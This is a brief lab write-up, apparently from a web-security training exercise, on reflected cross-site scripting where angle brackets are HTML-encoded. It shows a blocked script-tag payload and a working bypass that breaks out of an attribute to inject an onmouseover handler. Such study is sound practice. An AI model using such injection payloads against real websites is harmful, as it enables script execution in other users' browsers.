# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

  
**Notes**

**My Analysis**

**Request:**

    GET /?search=<p><script>alert('hello%252bfrom%252bhecker')</script></p>

**Response:**

    '&lt;p&gt;&lt;script&gt;alert(&apos;hello%2bfrom%2bhecker&apos;)&lt;/script&gt;&lt;/p&gt;'

  **Observations**

*Looking at the request-response, all brackets(<,>) are encoded.*

**Workaround**

**Goal : Bypass angle brackets**

Event handler injection:

    search="onmouseover="alert('hello from hecker')

More about JS event handlers : [https://www.javatpoint.com/javascript-events](https://www.javatpoint.com/javascript-events)